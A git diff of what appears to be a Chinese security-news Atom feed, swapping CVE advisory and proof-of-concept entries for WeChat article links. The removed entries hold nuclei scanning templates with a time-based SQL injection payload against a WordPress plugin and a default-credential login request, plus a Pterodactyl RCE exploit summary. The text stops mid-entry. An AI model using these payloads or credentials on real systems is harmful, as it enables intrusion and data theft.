+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
   <entry>
-    <title>An issue in mmzdev KnowledgeGPT V005 allows a remote attacker to execute arbitrary code via</title>
-    <link href="http://example.com/2025/06/24/github_2758121294/"/>
-    <id>http://example.com/2025/06/24/github_2758121294/</id>
-    <published>2025-06-24T22:00:06.236Z</published>
-    <updated>2025-06-24T22:00:06.234Z</updated>
+    <title>Notepad++ 存在严重权限提升漏洞，PoC已发布</title>
+    <link href="http://example.com/2025/06/25/weixin_1242927965/"/>
+    <id>http://example.com/2025/06/25/weixin_1242927965/</id>
+    <published>2025-06-25T05:22:37.671Z</published>
+    <updated>2025-06-25T05:22:37.669Z</updated>
     
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-3hgw-75v6-8742">https://github.com/advisories/GHSA-3hgw-75v6-8742</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37743">https://nvd.nist.gov/vuln/detail/CVE-2024-37743</a></p></li><li><p><a href="https://github.com/mmz-001/knowledge_gpt/blob/main/knowledge_gpt/main.py">https://github.com/mmz-001/knowledge_gpt/blob/main/knowledge_gpt/main.py</a></p></li><li><p><a href="https://medium.com/@cnetsec/vulnerability-identified-in-knowledgegpt-version-0-0-5-5168ec081842">https://medium.com/@cnetsec/vulnerability-identified-in-knowledgegpt-version-0-0-5-5168ec081842</a></p></li><li><p><a href="https://github.com/advisories/GHSA-3hgw-75v6-8742">https://github.com/advisories/GHSA-3hgw-75v6-8742</a></p></li></ul><p><strong>描述：</strong></p><p>An issue in mmzdev KnowledgeGPT V.0.0.5 allows a remote attacker to execute arbitrary code via the Document Display Component.</p>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> FreeBuf</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/t8lVqh9mH_ThfG3xOGGTsQ">https://mp.weixin.qq.com/s/t8lVqh9mH_ThfG3xOGGTsQ</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-3hgw-75v6-8742&quot;&gt;https://github.com/advisories/GHSA-3hgw-75v6-8742&lt;/a&gt;&lt;/p</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; FreeBuf&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/t8lVqh9mH_ThfG3xOGGTsQ&quot;&gt;https://mp.weixin.q</summary>
       
     
     
     
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="FreeBuf" scheme="http://example.com/tags/FreeBuf/"/>
     
   </entry>
   
   <entry>
-    <title>CVE-2025-3777 URL Parsing Issue</title>
-    <link href="http://example.com/2025/06/24/other_2176069830/"/>
-    <id>http://example.com/2025/06/24/other_2176069830/</id>
-    <published>2025-06-24T21:00:18.991Z</published>
-    <updated>2025-06-24T21:00:18.985Z</updated>
+    <title>CNVD漏洞周报2025年第23期</title>
+    <link href="http://example.com/2025/06/25/weixin_1916729953/"/>
+    <id>http://example.com/2025/06/25/weixin_1916729953/</id>
+    <published>2025-06-25T05:19:33.243Z</published>
+    <updated>2025-06-25T05:19:33.237Z</updated>
     
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://huntr.com/bounties/ccba0730-9248-4853-b7ff-5c20e6364f09">https://huntr.com/bounties/ccba0730-9248-4853-b7ff-5c20e6364f09</a></p>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 国家互联网应急中心CNCERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/PKyu1nrhHxPKAV5gBMvtsA">https://mp.weixin.qq.com/s/PKyu1nrhHxPKAV5gBMvtsA</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://huntr.com/bounties/ccba0730-9248-4853-b7ff-5c20e6364f09&quot;&gt;https://huntr.com/bounties/ccba0730-9248-4</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 国家互联网应急中心CNCERT&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/PKyu1nrhHxPKAV5gBMvtsA&quot;&gt;https://mp.</summary>
       
     
     
     
-    <category term="其他" scheme="http://example.com/categories/%E5%85%B6%E4%BB%96/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="huntr.com" scheme="http://example.com/tags/huntr-com/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="国家互联网应急中心CNCERT" scheme="http://example.com/tags/%E5%9B%BD%E5%AE%B6%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E6%80%A5%E4%B8%AD%E5%BF%83CNCERT/"/>
     
   </entry>
   
   <entry>
-    <title>Pterodactyl Panel 远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/24/github_2455687103/"/>
-    <id>http://example.com/2025/06/24/github_2455687103/</id>
-    <published>2025-06-24T20:15:16.831Z</published>
-    <updated>2025-06-24T20:15:16.829Z</updated>
+    <title>网络安全信息与动态周报2025年第25期（6月16日-6月22日）</title>
+    <link href="http://example.com/2025/06/25/weixin_3551478892/"/>
+    <id>http://example.com/2025/06/25/weixin_3551478892/</id>
+    <published>2025-06-25T05:19:32.744Z</published>
+    <updated>2025-06-25T05:19:32.741Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Pterodactyl Panel 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49132</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Pterodactyl Panel 存在一个严重的远程代码执行漏洞，影响版本从1.9.0到1.11.10。该漏洞允许攻击者在受影响的系统上执行任意命令，可能导致系统完全被控制。漏洞的利用可以通过检测特定的日志条目来识别，如’Illuminate\\Translation\\FileLoader-&gt;load()’。此信息仅供教育目的或在授权的挑战中使用，如CTF，未经许可攻击机器是非法的。</p><p><strong>产品厂商：</strong> pterodactyl</p><p><strong>产品名称：</strong> panel</p><p><strong>影响版本：</strong> 1.9.0 &lt;&#x3D; version &lt;&#x3D; 1.11.10</p><p><strong>来源：</strong> <a href="https://github.com/63square/CVE-2025-49132">https://github.com/63square/CVE-2025-49132</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li><li>dump-creds.py</li><li>exploit.py</li><li>test.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-49132-10-0-Critical"><a href="#CVE-2025-49132-10-0-Critical" class="headerlink" title="CVE-2025-49132 - 10.0 (Critical)"></a>CVE-2025-49132 - 10.0 (Critical)</h2><p><a href="https://github.com/pterodactyl/panel/security/advisories/GHSA-24wv-6c99-f843">https://github.com/pterodactyl/panel/security/advisories/GHSA-24wv-6c99-f843</a></p><p>Vulnerable versions: 1.9.0 .. 1.11.10</p><h3 id="OpSec-Considerations"><a href="#OpSec-Considerations" class="headerlink" title="OpSec Considerations"></a>OpSec Considerations</h3><p>RCE exploitation is limited but can be detected through:</p><p><code>cat /var/www/pterodactyl/storage/logs/laravel-2025-*-*.log | grep &#39;Illuminate\\\\Translation\\\\FileLoader-&gt;load()&#39;</code></p><p>If access logs are disabled as they are with default configuration (without SSL) credential dumping cannot be detected as easily, otherwise you can search for <code>locale=..</code> in the access logs</p><h3 id="Legal"><a href="#Legal" class="headerlink" title="Legal"></a>Legal</h3><p>This is entirely for educational purposes or for use in authorized challenges such as a CTF, it is illegal to attack a machine without prior permission.</p>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 国家互联网应急中心CNCERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Ca7KqQcRLqxP0NYwKKdxXA">https://mp.weixin.qq.com/s/Ca7KqQcRLqxP0NYwKKdxXA</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Pterodactyl Panel 远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;stro</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 国家互联网应急中心CNCERT&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Ca7KqQcRLqxP0NYwKKdxXA&quot;&gt;https://mp.</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    <category term="国家互联网应急中心CNCERT" scheme="http://example.com/tags/%E5%9B%BD%E5%AE%B6%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E6%80%A5%E4%B8%AD%E5%BF%83CNCERT/"/>
     
   </entry>
   
   <entry>
-    <title>Likes and Dislikes Plugin SQL注入漏洞</title>
-    <link href="http://example.com/2025/06/24/github_343773752/"/>
-    <id>http://example.com/2025/06/24/github_343773752/</id>
-    <published>2025-06-24T18:15:14.883Z</published>
-    <updated>2025-06-24T18:15:14.879Z</updated>
+    <title>APT36（透明部落） 利用凭证窃取恶意软件攻击印度国防安全部门</title>
+    <link href="http://example.com/2025/06/25/weixin_1253898174/"/>
+    <id>http://example.com/2025/06/25/weixin_1253898174/</id>
+    <published>2025-06-25T05:17:59.901Z</published>
+    <updated>2025-06-25T05:17:59.898Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Likes and Dislikes Plugin SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5287</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> WordPress的Likes and Dislikes插件在1.0.0及之前版本中，由于对用户提供的’post’参数转义不足以及现有SQL查询准备不充分，存在SQL注入漏洞。这使得未经认证的攻击者可以向现有查询中追加额外的SQL查询，从而可能从数据库中提取敏感信息。</p><p><strong>产品厂商：</strong> WordPress</p><p><strong>产品名称：</strong> Likes and Dislikes Plugin</p><p><strong>影响版本：</strong> version &lt;&#x3D; 1.0.0</p><p><strong>搜索语法：</strong> &#x2F;wp-content&#x2F;plugins&#x2F;posts-like-dislike&#x2F;</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/557244cba20532538e348ff8f6f8077c6583981b/http%2Fcves%2F2025%2FCVE-2025-5287.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/557244cba20532538e348ff8f6f8077c6583981b/http%2Fcves%2F2025%2FCVE-2025-5287.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">5287</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Likes and Dislikes Plugin <span class="hljs-operator">&lt;=</span> <span class="hljs-number">1.0</span>.<span class="hljs-number">0</span> <span class="hljs-operator">-</span> Unauthenticated SQL Injection<br>  <span class="hljs-params">author:</span> CodeStuffBreakThings<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    The Likes and Dislikes Plugin plugin for WordPress is vulnerable to SQL Injection via the &#x27;post&#x27; parameter <span class="hljs-keyword">in</span> all versions up to, and including, <span class="hljs-number">1.0</span>.<span class="hljs-number">0</span> due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.  This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.<br>  <span class="hljs-params">remediation:</span> No known patch at this time. Consider removing <span class="hljs-keyword">or</span> disabling the plugin until a patch is released.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>plugins.trac.wordpress.org<span class="hljs-operator">/</span>browser<span class="hljs-operator">/</span>inprosysmedia-likes-dislikes-post<span class="hljs-operator">/</span>trunk<span class="hljs-operator">/</span>inprosysmedia-likes-dislikes-post.php<span class="hljs-comment">#L76</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.wordfence.com<span class="hljs-operator">/</span>threat-intel<span class="hljs-operator">/</span>vulnerabilities<span class="hljs-operator">/</span>id<span class="hljs-operator">/</span>ad19205d-d355-<span class="hljs-number">45</span>d8-be5b-f8005459a8c7<span class="hljs-operator">?</span>source<span class="hljs-operator">=</span>cve<br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/XiaomingX/data-cve-poc/blob/main/2025/CVE-2025-5287/README.md</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:N<span class="hljs-operator">/</span>A:N<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">7.5</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">5287</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">89</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.00017</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.02613</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">publicwww-query:</span> <span class="hljs-string">&quot;/wp-content/plugins/posts-like-dislike/&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,wordpress,wp-plugin,wp,posts-like-dislike,time-based-sqli,sqli<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/wp-admin/admin-ajax.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">action</span><span class="hljs-operator">=</span>my_likes_dislikes_action&amp;post<span class="hljs-operator">=</span><span class="hljs-number">1</span> AND (SELECT <span class="hljs-number">1234</span> FROM (SELECT(SLEEP(<span class="hljs-number">6</span>)))a)&amp;state<span class="hljs-operator">=</span>like<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;duration&gt;=6&quot;</span><br>          <span class="hljs-operator">-</span> &#x27;contains_all(body, <span class="hljs-string">&quot;like&quot;</span>,<span class="hljs-string">&quot;dislike&quot;</span>)&#x27;<br>          <span class="hljs-operator">-</span> &#x27;status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span>&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/3qK7bzDxBMxG2nu98O-TWw">https://mp.weixin.qq.com/s/3qK7bzDxBMxG2nu98O-TWw</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Likes and Dislikes Plugin SQL注入漏洞&lt;/p&gt;
-&lt;</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/3qK7bzDxBMxG2nu98O-TWw&quot;&gt;https://mp.weixin.</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
     
   </entry>
   
   <entry>
-    <title>Atlona AT-OME-MS42 默认登录凭证漏洞</title>
-    <link href="http://example.com/2025/06/24/github_3005655972/"/>
-    <id>http://example.com/2025/06/24/github_3005655972/</id>
-    <published>2025-06-24T17:45:49.460Z</published>
-    <updated>2025-06-24T17:45:49.457Z</updated>
+    <title>以色列间谍软件利用WhatsApp新0day漏洞攻击传播</title>
+    <link href="http://example.com/2025/06/25/weixin_3739696320/"/>
+    <id>http://example.com/2025/06/25/weixin_3739696320/</id>
+    <published>2025-06-25T05:17:59.547Z</published>
+    <updated>2025-06-25T05:17:59.542Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Atlona AT-OME-MS42 默认登录凭证漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Atlona AT-OME-MS42是一款4x2矩阵切换器，支持HDMI、USB-C和DisplayPort输入。其Web界面存在默认凭证admin:Atlona，可能导致未授权访问。</p><p><strong>产品厂商：</strong> Atlona</p><p><strong>产品名称：</strong> AT-OME-MS42</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/070098dfa341efa9165d2c5ddf5e224f0cbdcd4d/http%2Fdefault-logins%2Fatlona%2FAT-OME-MS42-default-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/070098dfa341efa9165d2c5ddf5e224f0cbdcd4d/http%2Fdefault-logins%2Fatlona%2FAT-OME-MS42-default-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">AT-OME-MS42-default-login</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">The Atlona AT-OME-MS42 Default Login</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">matejsmycka</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">high</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">The Atlona AT-OME-MS42 is a 4x2 matrix switcher with HDMI, USB-C, and DisplayPort inputs. It has a web interface with default credentials admin:Atlona.</span><br>  <span class="hljs-attribute">reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://atlona.com/pdf/manuals/AT-OME-MS42_G.pdf</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">atlona, default-login</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br>        POST /cgi-bin/login.cgi?ssid=&#123;&#123;base64(&#x27;admin:Atlona&#x27;)&#125;&#125; HTTP/1.1<br>        <span class="hljs-attribute">Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#123;&#123;Hostname&#125;&#125;</span><br>        <span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">200</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;Login Success!&#x27;</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/6F3Adj2CaL2KweUDTHVcdQ">https://mp.weixin.qq.com/s/6F3Adj2CaL2KweUDTHVcdQ</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Atlona AT-OME-MS42 默认登录凭证漏洞&lt;/p&gt;
-&lt;p&gt;&lt;str</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/6F3Adj2CaL2KweUDTHVcdQ&quot;&gt;https://mp.weixin.</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
+    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
     
   </entry>
   
   <entry>
-    <title>Blink Router 命令注入漏洞</title>
-    <link href="http://example.com/2025/06/24/github_1488955261/"/>
-    <id>http://example.com/2025/06/24/github_1488955261/</id>
-    <published>2025-06-24T17:45:22.812Z</published>
-    <updated>2025-06-24T17:45:22.808Z</updated>
+    <title>以色列和伊朗冲突后黑客活动激增，双方网络战加剧</title>
+    <link href="http://example.com/2025/06/25/weixin_2567941166/"/>
+    <id>http://example.com/2025/06/25/weixin_2567941166/</id>
+    <published>2025-06-25T05:17:59.186Z</published>
+    <updated>2025-06-25T05:17:59.182Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Blink Router 命令注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-45985</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> B-LINK路由器BL-WR9000 V2.4.9、BL-AC2100_AZ3 V1.0.4、BL-X10_AC8 v1.0.5、BL-LTE300 v1.2.3、BL-F1200_AT1 v1.0.0、BL-X26_AC8 v1.2.8、BLAC450M_AE4 v4.0.0和BL-X26_DA3 v1.2.7版本中存在命令注入漏洞，攻击者可以通过bs_SetSSIDHide函数执行任意命令。</p><p><strong>产品厂商：</strong> B-LINK</p><p><strong>产品名称：</strong> Blink Router</p><p><strong>影响版本：</strong> BL-WR9000 V2.4.9, BL-AC2100_AZ3 V1.0.4, BL-X10_AC8 v1.0.5, BL-LTE300 v1.2.3, BL-F1200_AT1 v1.0.0, BL-X26_AC8 v1.2.8, BLAC450M_AE4 v4.0.0, BL-X26_DA3 v1.2.7</p><p><strong>搜索语法：</strong> title&#x3D;”B-LINK”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/d34f9b0cfbb8a01a5f0465acda11e465fdb507f9/http%2Fcves%2F2025%2FCVE-2025-45985.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/d34f9b0cfbb8a01a5f0465acda11e465fdb507f9/http%2Fcves%2F2025%2FCVE-2025-45985.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 